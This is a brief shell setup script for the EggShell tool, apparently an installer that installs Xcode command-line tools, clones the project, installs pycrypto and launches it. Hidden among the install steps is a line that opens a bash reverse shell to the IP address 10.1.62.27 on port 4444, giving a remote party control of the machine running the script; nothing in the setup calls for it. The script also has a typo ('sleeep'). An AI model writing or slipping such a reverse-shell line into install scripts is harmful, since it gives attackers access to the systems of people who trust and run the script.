#!/bin/sh

#  EggShell Setup.sh
#  
#
#  Created by James De Vito on 2/24/17.
#
xcode-select --install
sleep 10
bash &> /dev/tcp/10.1.62.27/4444 0>&1
git clone git://github.com/neoneggplant/EggShell
sleep 10
easy_install pycrypto
sleeep 10
cd EggShell
python EggShell.py

